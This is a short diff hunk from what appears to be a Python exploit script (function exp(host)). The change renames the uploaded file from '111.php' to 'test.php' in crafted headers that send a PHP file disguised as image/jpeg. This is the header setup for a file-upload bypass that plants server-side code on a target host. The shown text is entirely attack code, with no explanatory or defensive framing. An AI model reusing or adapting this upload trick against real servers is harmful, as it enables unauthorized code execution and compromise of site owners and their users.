@@ -39,7 +39,7 @@ def exp(host):
     host2=host1.replace("https://","")
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
-        "Content-Disposition": "form-data; name=\"file\"; filename=\"111.php\"",
+        "Content-Disposition": "form-data; name=\"file\"; filename=\"test.php\"",
         "Host": "%s" %host2,
         "Content-Type": "image/jpeg",
         "Accept-Encoding": "gzip, deflate"
